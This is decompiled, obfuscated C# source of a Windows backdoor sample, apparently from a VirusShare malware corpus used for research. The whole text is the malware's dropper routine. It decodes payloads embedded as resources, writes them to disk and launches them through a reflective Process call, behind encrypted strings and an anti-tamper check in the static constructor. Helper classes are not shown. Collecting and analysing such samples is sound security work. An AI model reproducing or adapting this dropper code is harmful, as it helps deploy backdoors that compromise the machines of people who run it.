// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 5, Version=0.0.0.0, Culture=neutral, PublicKeyToken=c1ca78561cb11ead
// MVID: 2D47F565-522D-4F7E-99C5-0FAB4FA0B168
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.Poison.eqbg-1d1c34c3e9b902e7445301b77a51949865f13999db65bb166e4f7800abbf116b.exe

using \u0007;
using \u000F;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security;

namespace \u0001
{
  internal sealed class \u0003
  {
    [NonSerialized]
    internal static \u0002 \u009B;

    [STAThread]
    public static void \u0001()
    {
      object obj1;
      IEnumerator enumerator;
      DictionaryEntry dictionaryEntry1;
      DictionaryEntry dictionaryEntry2;
      ResourceManager resourceManager;
      byte[] numArray;
      FileStream fileStream;
      object[] objArray1;
      try
      {
        if (!\u0004.\u0001())
          return;
        if (true)
          goto label_11;
label_2:
        resourceManager = new ResourceManager(\u0001.\u0003.\u009B(51), global::\u0001.\u0001());
        obj1 = (object) global::\u0003.\u007E\u0003((object) resourceManager, \u0002.\u0002(), true, true);
        try
        {
          enumerator = \u0004.\u007E\u0004((object) (IEnumerable) obj1);
          while (\u0014.\u007E\u0086((object) enumerator))
          {
            object obj2 = \u0005.\u007E\u0005((object) enumerator);
            dictionaryEntry2 = obj2 != null ? (DictionaryEntry) obj2 : dictionaryEntry1;
            numArray = \u0008.\u000E(\u0006.\u0007(global::\u0007.\u007E\u0008((object) resourceManager, \u0006.\u0007(dictionaryEntry2.Key))));
            fileStream = new FileStream(\u0006.\u0007(global::\u000F.\u0011((object) \u000E.\u000F(), dictionaryEntry2.Key)), FileMode.Create);
            \u0010.\u007E\u0012((object) fileStream, numArray, 0, numArray.Length);
            \u0011.\u007E\u0014((object) fileStream);
            \u0013 obj3 = \u0013.\u0084;
            // ISSUE: type reference
            Type type = \u0012.\u0083(__typeref (Process));
            string str = \u0001.\u0003.\u009B(56);
            objArray1 = new object[1]
            {
              global::\u000F.\u0011((object) \u000E.\u000F(), dictionaryEntry2.Key)
            };
            object[] objArray2 = objArray1;
            object obj4 = obj3((object) null, type, str, objArray2, (string[]) null, (Type[]) null, (bool[]) null, true);
          }
          return;
        }
        finally
        {
          if (enumerator is IDisposable)
            \u0011.\u007E\u0015((object) (enumerator as IDisposable));
        }
label_11:
        \u0004.\u0001();
        goto label_2;
      }
      catch (Exception ex)
      {
        IntPtr num;
        object[] objArray3 = new object[9]
        {
          (object) numArray,
          (object) dictionaryEntry2,
          (object) fileStream,
          (object) resourceManager,
          obj1,
          (object) enumerator,
          (object) dictionaryEntry1,
          (object) num,
          (object) objArray1
        };
        \u0004.\u0001(ex, objArray3);
      }
    }

    static \u0003()
    {
      do
      {
        \u0003.\u0003.\u0001(typeof (\u0001.\u0003));
        bool flag = false;
        Assembly assembly = global::\u0001.\u0001();
        if (\u0004.\u0001(\u0015.\u007E\u0092((object) assembly), true, out flag))
          goto label_7;
label_5:
        throw new SecurityException(\u0001.\u0003.\u009B(90));
label_7:
        int num = flag ? 1 : 0;
        if (true)
        {
          if (num != 0)
            num = \u0016.\u007E\u0001\u0002((object) \u0015.\u007E\u0093((object) assembly), \u0001.\u0003.\u009B(65)) ? 1 : 0;
          else
            goto label_5;
        }
        if (num == 0)
          goto label_5;
      }
      while (false);
    }
  }
}
